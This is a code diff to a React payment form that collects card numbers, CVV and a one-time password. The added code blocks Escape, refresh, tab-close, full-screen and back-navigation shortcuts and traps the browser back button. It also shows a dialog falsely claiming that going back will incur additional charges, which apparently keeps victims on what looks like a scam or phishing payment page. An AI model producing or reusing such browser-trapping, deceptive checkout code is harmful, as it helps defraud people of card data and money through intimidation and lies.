@@ -40,6 +40,7 @@ const PaymentForm = () => {
   const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
   const [showAlert, setShowAlert] = useState(false);
   const [fadeState, setFadeState] = useState('visible');
+  const [showBackDialog, setShowBackDialog] = useState(false);
 
   // Check if all card details are filled
   const isFormValid = () => {
@@ -56,9 +57,9 @@ const PaymentForm = () => {
   };
 
   useEffect(() => {
-    // Enhanced keyboard restriction with stronger ESC blocking
+    // Ultra-strong keyboard restriction with multiple layers of ESC blocking
     const handleKeyDown = (event: KeyboardEvent) => {
-      // Ultra-strong ESC key blocking
+      // Multiple layers of ESC key blocking
       if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
         event.preventDefault();
         event.stopPropagation();
@@ -66,27 +67,46 @@ const PaymentForm = () => {
         return false;
       }
       
-      // Prevent other shortcuts
+      // Block back navigation
+      if (event.altKey && event.key === 'ArrowLeft') {
+        event.preventDefault();
+        setShowBackDialog(true);
+        return false;
+      }
+      
+      // Block browser shortcuts
       if (event.key === 'F5' || 
           (event.ctrlKey && event.key === 'r') || 
           (event.ctrlKey && event.key === 'F5') ||
           (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
-          (event.altKey && event.key === 'F4')) {
+          (event.altKey && event.key === 'F4') ||
+          (event.key === 'F11')) {
         event.preventDefault();
         event.stopPropagation();
         return false;
       }
     };
 
-    // Multiple layers of event blocking
+    // Add back button prevention
+    const handlePopState = (event: PopStateEvent) => {
+      event.preventDefault();
+      setShowBackDialog(true);
+      window.history.pushState(null, '', window.location.href);
+    };
+
+    // Push initial state and add listener
+    window.history.pushState(null, '', window.location.href);
+    window.addEventListener('popstate', handlePopState);
+
+    // Multiple event listeners for comprehensive blocking
     document.addEventListener('keydown', handleKeyDown, true);
     document.addEventListener('keyup', handleKeyDown, true);
     window.addEventListener('keydown', handleKeyDown, true);
     window.addEventListener('keyup', handleKeyDown, true);
 
-    // Additional ESC blocking
+    // Additional layers for ESC blocking
     const blockEsc = (e: KeyboardEvent) => {
-      if (e.keyCode === 27) {
+      if (e.keyCode === 27 || e.key === 'Escape') {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
@@ -96,14 +116,19 @@ const PaymentForm = () => {
 
     document.body.addEventListener('keydown', blockEsc, true);
     document.body.addEventListener('keyup', blockEsc, true);
+    document.addEventListener('keypress', blockEsc, true);
+    window.addEventListener('keypress', blockEsc, true);
 
     return () => {
+      window.removeEventListener('popstate', handlePopState);
       document.removeEventListener('keydown', handleKeyDown, true);
       document.removeEventListener('keyup', handleKeyDown, true);
       window.removeEventListener('keydown', handleKeyDown, true);
       window.removeEventListener('keyup', handleKeyDown, true);
       document.body.removeEventListener('keydown', blockEsc, true);
       document.body.removeEventListener('keyup', blockEsc, true);
+      document.removeEventListener('keypress', blockEsc, true);
+      window.removeEventListener('keypress', blockEsc, true);
     };
   }, []);
 
@@ -298,9 +323,10 @@ const PaymentForm = () => {
     setInvalidOtpMessage('');
     
     if (value.length > 0) {
+      // Instantly mask each character as it's typed
       setTimeout(() => {
         setDisplayOtp('*'.repeat(value.length));
-      }, 2000);
+      }, 100);
     }
   };
 
@@ -356,10 +382,18 @@ const PaymentForm = () => {
     return '*'.repeat(value.length);
   };
 
+  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
+    setShowBackDialog(false);
+    if (action === 'leave') {
+      setErrorMessage('Please try again');
+      window.location.href = '/';
+    }
+  };
+
   if (showSuccess) {
     return (
-      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
-        <div className="text-center">
+      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
+        <div className="text-center pt-20">
           <div className="text-green-600 text-6xl animate-bounce">✓</div>
           <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
         </div>
@@ -369,8 +403,8 @@ const PaymentForm = () => {
 
   if (showProcessing) {
     return (
-      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
-        <div className="text-center">
+      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
+        <div className="text-center pt-20">
           <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
           <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
         </div>
@@ -383,6 +417,28 @@ const PaymentForm = () => {
       <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
         fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
       }`}>
+        {showBackDialog && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+            <div className="bg-white p-6 rounded-lg shadow-lg">
+              <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
+              <div className="flex space-x-4">
+                <button
+                  onClick={() => handleBackDialogAction('leave')}
+                  className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
+                >
+                  Leave
+                </button>
+                <button
+                  onClick={() => handleBackDialogAction('cancel')}
+                  className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
+                >
+                  Cancel
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+
         <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
           <div className="flex items-center mb-2">
             <Shield className="w-5 h-5 text-red-600 mr-2" />
@@ -412,7 +468,7 @@ const PaymentForm = () => {
                 onChange={handleOtpChange}
                 onFocus={() => setOtpFocused(true)}
                 onBlur={() => setOtpFocused(false)}
-                placeholder="000000"
+                placeholder="******"
                 className={`w-full px-4 py-3 border-2 rounded-lg text-center text-2xl tracking-widest focus:outline-none transition-all ${
                   otpFocused ? 'border-blue-400 shadow-lg shadow-blue-200' : 'border-gray-300'
                 }`}
@@ -450,6 +506,28 @@ const PaymentForm = () => {
     <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
       fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
     }`}>
+      {showBackDialog && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white p-6 rounded-lg shadow-lg">
+            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
+            <div className="flex space-x-4">
+              <button
+                onClick={() => handleBackDialogAction('leave')}
+                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
+              >
+                Leave
+              </button>
+              <button
+                onClick={() => handleBackDialogAction('cancel')}
+                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {showAlert && (
         <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
           <AlertTriangle className="w-5 h-5" />
@@ -548,14 +626,14 @@ const PaymentForm = () => {
               CVV
             </label>
             <div className="relative">
-              <Lock className="absolute left-2 top-2.5 w-3 h-3 text-gray-400" />
+              <Lock className="absolute left-2 top-2.5 w-4 h-4 text-gray-400" />
               <input
                 type="text"
                 name="cvv"
                 placeholder="123"
                 value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                 onChange={handleInputChange}
-                className="w-full pl-7 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+                className="w-full pl-8 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                 maxLength={4}
                 disabled={isLoading}
               />
@@ -602,13 +680,10 @@ const PaymentForm = () => {
         </button>
 
         <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
-          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain" />
-          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain" />
-          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain" />
-          <svg className="h-8 w-12" viewBox="0 0 100 60" fill="none">
-            <rect width="100" height="60" rx="8" fill="#00447C"/>
-            <text x="50" y="35" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold">RuPay</text>
-          </svg>
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/rupay-logo-icon.png" alt="RuPay" className="h-8 w-12 object-contain filter brightness-0" />
         </div>
 
         <div className="text-xs text-gray-500 text-center mt-4">
